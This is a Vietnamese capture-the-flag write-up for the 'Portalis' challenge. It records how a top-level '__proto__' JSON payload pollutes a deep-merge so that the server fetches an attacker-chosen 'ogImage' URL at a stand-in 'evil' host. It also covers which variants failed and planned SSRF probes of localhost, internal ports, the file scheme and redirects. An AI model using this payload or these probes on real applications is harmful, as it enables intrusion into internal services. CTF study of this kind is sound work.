# Portalis CTF — Writeup & Findings

- **Target:** http://91.107.189.166:3000
- **Ngày:** 2026-08-29 / 30
- **Trạng thái:** Đã xác nhận lỗ hổng Prototype Pollution + SSRF. **Chưa có flag.**

---

## 1. Tình trạng kết nối

- Server rất không ổn định: lúc `Connection refused`, lúc HTTP 200, lúc timeout (exit 28).
- Mọi request đều phải bọc trong vòng retry (4–6 lần) mới thành công.
- Proxy phía trước: **nginx/1.31.4** (hiện trang 502 khi backend treo).

## 3. Finding quan trọng nhất — `/api/schema`

```json
{
  "settable": ["name", "bio", "accent", "avatarUrl", "links"],
  "rendered_context": [
    "name",
    "bio",
    "accent",
    "avatarUrl",
    "links",
    "ogImage"
  ],
  "note": "ogImage is reserved and populated by the media pipeline; it is not accepted from theme input"
}
```

→ `ogImage` **được dùng khi render** nhưng **bị cấm set trực tiếp** — mục tiêu rõ ràng của challenge.

Trang `/help` còn tiết lộ: `PUT /api/theme` **deep-merge** JSON người dùng vào profile hiện tại ("omit a field to leave it unchanged").

## 4. Auth

- **Không cần đăng ký/đăng nhập.** `PUT /api/theme` đầu tiên tự tạo profile và set cookie HttpOnly `sid`.
- Session ví dụ: `sid=32e60c9ec37538b00223ea9718e4f3b7`

## 5. ✅ Prototype Pollution — ĐÃ XÁC NHẬN

- Set `ogImage` top-level → **400 Bad Request** (bị chặn đúng như schema).
- Gửi (`curl -X PUT -H "Content-Type: application/json"`):

```json
{ "bio": "v7", "__proto__": { "ogImage": "http://evil/og.png" } }
```

→ **HTTP 200**, sau đó `GET /api/preview` trả về:

```
fetch failed: getaddrinfo ETIMEOUT evil
```

→ Deep-merge **không bảo vệ `__proto__`** → pollute được Object.prototype, `ogImage` trở thành property kế thừa mà pipeline đọc.

### Các biến bản KHÔNG hoạt động

- `constructor.prototype` → bị bỏ qua
- `__proto__` lồng trong `links` (`links.__proto__`) → bị bỏ qua
- `__proto__` lồng sâu (`links.a.__proto__`) → bị bỏ qua
- **Chỉ `__proto__` ở top-level mới pollute.**

## 6. ✅ SSRF — ĐÃ XÁC NHẬN (qua pollution)

- Thông báo lỗi `fetch failed: getaddrinfo ETIMEOUT ...` là lỗi **Node.js/undici** — chứng minh server chủ động **fetch URL nằm trong `ogImage`** phía server.
- Lỗi cũng là **oracle**: phân biệt hostname không resolve được vs lỗi khác.
- Trên `/u/me`: thẻ `<meta property="og:image" content="">` rỗng nhưng dòng
  `portal-diag` hiển thị `preview-card: fetch failed: getaddrinfo ETIMEOUT evil`
  → xác nhận `ogImage` nằm trên prototype (kế thừa), không phải own-property của profile.

## 7. ⚠️ Vấn đề đang kẹt

- SSRF tới `http://127.0.0.1:3000/api/schema`: PUT thành công nhưng đọc preview chỉ được **502 nginx** hoặc **kết quả cũ** ("ETIMEOUT evil").
- Nghi ngờ: app tự fetch vào chính nó gây treo (Node single-thread), hoặc preview bị cache / DNS cache giữ lỗi cũ.
- Trên profile mới, pollution đôi khi không manifest — hành vi chưa nhất quán, cần làm rõ (có thể liên quan timing/cache).
- Chưa xác nhận preview có **reflecx body** của response SSRF không (mới thấy error message) — đây là bước quyết định để đọc flag.

## 8. Next steps

1. Xác nhận cơ chế cache/timing của `/api/preview` (đọc ngay sau PUT, đợi fetch cũ xong).
2. Nếu preview hiện body → SSRF đọc nội bộ: thử `http://127.0.0.1:3000/`, các port nội bộ khác,
   `http://localhost`, file scheme, redirect bypass.
3. Tìm endpoint nội bộ chứa flag (đoán: service "media pipeline" / admin chạy port khác).
4. Ghi chú: mọi request cần retry vì mạng chập chờn.
